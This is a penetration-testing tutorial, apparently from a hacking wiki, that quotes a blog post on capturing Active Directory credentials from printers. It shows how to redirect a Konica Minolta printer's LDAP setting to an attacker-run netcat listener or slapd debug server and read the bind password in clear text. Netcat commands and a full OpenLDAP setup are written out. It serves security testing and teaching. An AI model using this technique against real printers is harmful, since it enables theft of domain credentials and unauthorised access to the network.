# AD information in printers

There are several blogs in the Internet which** highlight the dangers of leaving printers configured with LDAP with default/weak** logon credentials.\
This is because an attacker could **trick the printer to authenticate against a rouge LDAP server** (typically a `nc -vv -l -p 444` is enough) and to capture the printer **credentials on clear-text**.

Also, several printers will contains** logs with usernames** or could even be able to **download all usernames **from the Domain Controller.

All this **sensitive information** and the common** lack of security **makes printers very interesting for attackers.

Some blogs about the topic:

* [https://www.ceos3c.com/hacking/obtaining-domain-credentials-printer-netcat/](https://www.ceos3c.com/hacking/obtaining-domain-credentials-printer-netcat/)
* [https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)

**The following information was copied from **[**https://grimhacker.com/2018/03/09/just-a-printer/**](https://grimhacker.com/2018/03/09/just-a-printer/)****

## LDAP settings

On Konica Minolta printers it is possible to configure an LDAP server to connect to, along with credentials. In earlier versions of the firmware on these devices I have heard it is possible to recover the credentials simply by reading the html source of the page. Now, however the credentials are not returned in the interface so we have to work a little harder.

The list of LDAP Servers is under: Network > LDAP Setting > Setting Up LDAP

The interface allows the LDAP server to be modified without re-entering the credentials that will be used to connect. I presume this is for a simpler user experience, but it gives an opportunity for an attacker to escalate from master of a printer to a toe hold on the domain.

We can reconfigure the LDAP server address setting to a machine we control, and trigger a connection with the helpful “Test Connection” functionality.

## Listening for the goods

### netcat

If you have better luck than me, you may be able to get away with a simple netcat listener:

```
sudo nc -k -v -l -p 386
```

I am assured by [@\_castleinthesky](https://twitter.com/\_castleinthesky) that this works most of the time, however I have yet to be let off that easy.

### Slapd

I have found that a full LDAP server is required as the printer first attempts a null bind and then queries the available information, only if these operations are successful does it proceed to bind with the credentials.

I searched for a simple ldap server that met the requirements, however there seemed to be limited options. In the end I opted to setup an open ldap server and use the slapd debug server service to accept connections and print out the messages from the printer. (If you know of an easier alternative, I would be happy to hear about it)

#### Installation

(Note this section is a lightly adapted version of the guide here [https://www.server-world.info/en/note?os=Fedora\_26\&p=openldap](https://www.server-world.info/en/note?os=Fedora\_26\&p=openldap) )

From a root terminal:

**Install OpenLDAP,**

```
#> dnf install -y install openldap-servers openldap-clients

#> cp /usr/share/openldap-servers/DB_CONFIG.example /var/lib/ldap/DB_CONFIG 

#> chown ldap. /var/lib/ldap/DB_CONFIG
```

**Set an OpenLDAP admin password (you will need this again shortly)**

```
#> slappasswd 
New password:
Re-enter new password:
{SSHA}xxxxxxxxxxxxxxxxxxxxxxxx
```

```
#> vim chrootpw.ldif
# specify the password generated above for "olcRootPW" section
dn: olcDatabase={0}config,cn=config
changetype: modify
add: olcRootPW
olcRootPW: {SSHA}xxxxxxxxxxxxxxxxxxxxxxxx
```

```
#> ldapadd -Y EXTERNAL -H ldapi:/// -f chrootpw.ldif
SASL/EXTERNAL authentication started
SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth
SASL SSF: 0
modifying entry "olcDatabase={0}config,cn=config"
```

**Import basic Schemas**

```
#> ldapadd -Y EXTERNAL -H ldapi:/// -f /etc/openldap/schema/cosine.ldif 
SASL/EXTERNAL authentication started
SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth
SASL SSF: 0
adding new entry "cn=cosine,cn=schema,cn=config"

#> ldapadd -Y EXTERNAL -H ldapi:/// -f /etc/openldap/schema/nis.ldif 
SASL/EXTERNAL authentication started
SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth
SASL SSF: 0
adding new entry "cn=nis,cn=schema,cn=config"

#> ldapadd -Y EXTERNAL -H ldapi:/// -f /etc/openldap/schema/inetorgperson.ldif 
SASL/EXTERNAL authentication started
SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth
SASL SSF: 0
adding new entry "cn=inetorgperson,cn=schema,cn=config"
```

**Set your domain name on LDAP DB.**

```
# generate directory manager's password
#> slappasswd 
New password:
Re-enter new password:
{SSHA}xxxxxxxxxxxxxxxxxxxxxxxx

#> vim chdomain.ldif
# specify the password generated above for "olcRootPW" section
dn: olcDatabase={1}monitor,cn=config
changetype: modify
replace: olcAccess
olcAccess: {0}to * by dn.base="gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth"
read by dn.base="cn=Manager,dc=foo,dc=bar" read by * none

dn: olcDatabase={2}mdb,cn=config
changetype: modify
replace: olcSuffix
olcSuffix: dc=foo,dc=bar

dn: olcDatabase={2}mdb,cn=config
changetype: modify
replace: olcRootDN
olcRootDN: cn=Manager,dc=foo,dc=bar

dn: olcDatabase={2}mdb,cn=config
changetype: modify
add: olcRootPW
olcRootPW: {SSHA}xxxxxxxxxxxxxxxxxxxxxxxx

dn: olcDatabase={2}mdb,cn=config
changetype: modify
add: olcAccess
olcAccess: {0}to attrs=userPassword,shadowLastChange by
dn="cn=Manager,dc=foo,dc=bar" write by anonymous auth by self write by * none
olcAccess: {1}to dn.base="" by * read
olcAccess: {2}to * by dn="cn=Manager,dc=foo,dc=bar" write by * read

#> ldapmodify -Y EXTERNAL -H ldapi:/// -f chdomain.ldif 
SASL/EXTERNAL authentication started
SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth
SASL SSF: 0
modifying entry "olcDatabase={1}monitor,cn=config"

modifying entry "olcDatabase={2}mdb,cn=config"

modifying entry "olcDatabase={2}mdb,cn=config"

modifying entry "olcDatabase={2}mdb,cn=config"

modifying entry "olcDatabase={2}mdb,cn=config"

#> vim basedomain.ldif
dn: dc=foo,dc=bar
objectClass: top
objectClass: dcObject
objectclass: organization
o: Foo Bar
dc: DC1

dn: cn=Manager,dc=foo,dc=bar
objectClass: organizationalRole
cn: Manager
description: Directory Manager

dn: ou=People,dc=foo,dc=bar
objectClass: organizationalUnit
ou: People

dn: ou=Group,dc=foo,dc=bar
objectClass: organizationalUnit
ou: Group

#> ldapadd -x -D cn=Manager,dc=foo,dc=bar -W -f basedomain.ldif 
Enter LDAP Password: # directory manager's password
adding new entry "dc=foo,dc=bar"

adding new entry "cn=Manager,dc=foo,dc=bar"

adding new entry "ou=People,dc=foo,dc=bar"

adding new entry "ou=Group,dc=foo,dc=bar"
```

**Configure LDAP TLS**

**Create and SSL Certificate**

```
#> cd /etc/pki/tls/certs 
#> make server.key 
umask 77 ; \
/usr/bin/openssl genrsa -aes128 2048 > server.key
Generating RSA private key, 2048 bit long modulus
...
...
e is 65537 (0x10001)
Enter pass phrase: # set passphrase
Verifying - Enter pass phrase: # confirm

# remove passphrase from private key
#> openssl rsa -in server.key -out server.key 
Enter pass phrase for server.key: # input passphrase
writing RSA key

#> make server.csr 
umask 77 ; \
/usr/bin/openssl req -utf8 -new -key server.key -out server.csr
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [XX]: # country
State or Province Name (full name) []: # state
Locality Name (eg, city) [Default City]: # city
Organization Name (eg, company) [Default Company Ltd]: # company
Organizational Unit Name (eg, section) []:Foo Bar # department
Common Name (eg, your name or your server's hostname) []:www.foo.bar # server's FQDN
Email Address []:xxx@foo.bar # admin email
Please enter the following 'extra' attributes
to be sent with your certificate request
A challenge password []: # Enter
An optional company name []: # Enter

#> openssl x509 -in server.csr -out server.crt -req -signkey server.key -days 3650
Signature ok
subject=/C=/ST=/L=/O=/OU=Foo Bar/CN=dlp.foo.bar/emailAddress=xxx@roo.bar
Getting Private key
```

**Configure Slapd for SSL /TLS**

```
#> cp /etc/pki/tls/certs/server.key \
/etc/pki/tls/certs/server.crt \
/etc/pki/tls/certs/ca-bundle.crt \
/etc/openldap/certs/

#> chown ldap. /etc/openldap/certs/server.key \
/etc/openldap/certs/server.crt \
/etc/openldap/certs/ca-bundle.crt

#> vim mod_ssl.ldif
# create new
 dn: cn=config
changetype: modify
add: olcTLSCACertificateFile
olcTLSCACertificateFile: /etc/openldap/certs/ca-bundle.crt
-
replace: olcTLSCertificateFile
olcTLSCertificateFile: /etc/openldap/certs/server.crt
-
replace: olcTLSCertificateKeyFile
olcTLSCertificateKeyFile: /etc/openldap/certs/server.key

#> ldapmodify -Y EXTERNAL -H ldapi:/// -f mod_ssl.ldif 
SASL/EXTERNAL authentication started
SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth
SASL SSF: 0
modifying entry "cn=config"
```

**Allow LDAP through your local firewall**

```
firewall-cmd --add-service={ldap,ldaps}
```

### The payoff

Once you have installed and configured your LDAP service you can run it with the following command :

> ```
> slapd -d 2
> ```

The screen shot below shows an example of the output when we run the connection test on the printer. As you can see the username and password are passed from the LDAP client to server.

![slapd terminal output containing the username "MyUser" and password "MyPassword"](https://i1.wp.com/grimhacker.com/wp-content/uploads/2018/03/slapd_output.png?resize=474%2C163\&ssl=1)

## How bad can it be?

This very much depends on the credentials that have been configured.

If the principle of least privilege is being followed, then you may only get read access to certain elements of active directory. This is often still valuable as you can use that information to formulate further more accurate attacks.

Typically you are likely to get an account in the Domain Users group which may give access to sensitive information or form the prerequisite authentication for other attacks.

Or, like me, you may be rewarded for setting up an LDAP server and be handed a Domain Admin account on a silver platter.
